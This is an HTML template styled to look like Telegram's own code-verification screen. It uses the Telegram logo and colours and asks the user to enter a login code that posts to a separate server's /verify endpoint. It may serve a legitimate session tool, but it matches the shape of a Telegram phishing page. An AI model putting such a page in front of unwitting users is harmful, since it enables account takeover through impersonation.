<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Code Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #fff;
        }
        .container {
            background-color: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 2rem;
        }
        .logo img {
            width: 100px;
            height: 100px;
        }
        h1 {
            text-align: center;
            color: #2AABEE;
            margin-bottom: 1rem;
            font-size: 24px;
            font-weight: 500;
        }
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 2rem;
            font-size: 14px;
        }
        form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        input {
            padding: 0.8rem;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
            text-align: center;
            letter-spacing: 0.5em;
        }
        input:focus {
            outline: none;
            border-color: #2AABEE;
        }
        button {
            background-color: #2AABEE;
            color: white;
            padding: 0.8rem;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.2s;
            font-weight: 500;
        }
        button:hover {
            background-color: #229ED9;
        }
        .resend {
            text-align: center;
            margin-top: 1rem;
            font-size: 14px;
            color: #666;
        }
        .resend a {
            color: #2AABEE;
            text-decoration: none;
        }
        .resend a:hover {
            text-decoration: underline;
        }
        .error {
            color: #ff3b30;
            text-align: center;
            margin-bottom: 1rem;
            font-size: 14px;
        }
        .message {
            color: #4CAF50;
            text-align: center;
            margin-bottom: 1rem;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
        </div>
        <h1>Code Verification</h1>
        <div class="subtitle">We've sent the code to {{ phone }}</div>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        {% if message %}
        <div class="message">{{ message }}</div>
        {% endif %}
        <form action="/verify" method="POST">
            <input type="text" name="code" placeholder="Enter code" required pattern="[0-9]*" inputmode="numeric" maxlength="5">
            <button type="submit">Verify</button>
        </form>
        <div class="resend">
            Didn't receive the code or code expired? <a href="/resend">Send code again</a>
        </div>
    </div>
</body>
</html>
